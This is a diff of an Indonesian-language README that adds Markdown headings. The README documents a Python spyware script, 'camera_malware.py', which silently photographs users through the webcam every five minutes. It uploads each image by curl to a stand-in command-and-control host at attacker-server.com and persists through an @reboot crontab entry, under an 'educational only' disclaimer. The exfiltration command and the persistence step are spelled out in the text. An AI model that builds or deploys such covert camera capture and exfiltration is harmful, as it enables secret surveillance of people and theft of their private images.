@@ -46,7 +46,7 @@ Copy
 
 Download
 python3 camera_malware.py
-Cara Penggunaan
+## Cara Penggunaan
 Program akan langsung berjalan setelah dieksekusi. Berikut adalah alurnya:
 
 Program membuat direktori /tmp/captured untuk menyimpan gambar.
@@ -65,37 +65,37 @@ Menunggu selama 300 detik (5 menit) sebelum mengulang.
 
 Untuk menghentikan program, tekan Ctrl+C di terminal.
 
-Cara Kerja
-1. Inisialisasi (__init__)
-Menentukan direktori penyimpanan (/tmp/captured) dan membuatnya jika belum ada.
+## Cara Kerja
+### 1. Inisialisasi (__init__)
+- Menentukan direktori penyimpanan (/tmp/captured) dan membuatnya jika belum ada.
 
-2. capture_image(camera_index)
-Membuka kamera dengan indeks tertentu.
+### 2. capture_image(camera_index)
+- Membuka kamera dengan indeks tertentu.
 
-Membaca satu frame.
+- Membaca satu frame.
 
-Jika berhasil, menyimpan frame sebagai file JPEG dengan timestamp.
+- Jika berhasil, menyimpan frame sebagai file JPEG dengan timestamp.
 
 Memanggil exfiltrate_data untuk mengirim file.
 
 Menutup kamera.
 
-3. exfiltrate_data(filename)
+### 3. exfiltrate_data(filename)
 Menjalankan perintah curl untuk mengunggah file ke server C2.
 
 Perintah: curl -F 'file=@nama_file' http://attacker-server.com/upload
 
-4. make_persistent()
+### 4. make_persistent()
 Membaca crontab pengguna saat ini.
 
 Jika entri @reboot python3 /path/to/malware.py belum ada, menambahkannya ke file sementara lalu memperbarui crontab.
 
-5. run()
+### 5. run()
 Memanggil make_persistent() sekali.
 
 Melakukan loop tak terbatas: mencoba kamera 0, jika gagal coba kamera 1, lalu tidur 300 detik.
 
-Cat Penting
+## Cat Penting
 Edukasi: Program ini dibuat untuk mempelajari teknik dasar malware: akses perangkat keras, penyimpanan data, komunikasi dengan server, dan persistence.
 
 Keamanan: Jangan gunakan di sistem orang lain tanpa izin. Selalu patuhi hukum dan etika.
@@ -104,6 +104,6 @@ Pengujian: Jika ingin menguji, gunakan server C2 buatan sendiri (misal dengan nc
 
 Perbaikan: Dalam versi nyata, malware biasanya menggunakan enkripsi, penyamaran, dan teknik anti-deteksi. Kode ini hanya contoh sederhana.
 
-Lisensi
+## Lisensi
 Kode ini disediakan hanya untuk tujuan edukasi. Tidak ada lisensi khusus; Anda bebas mempelajari dan memodifikasinya untuk pembelajaran. Namun, penulis tidak bertanggung jawab atas penyalahgunaan kode ini.
 
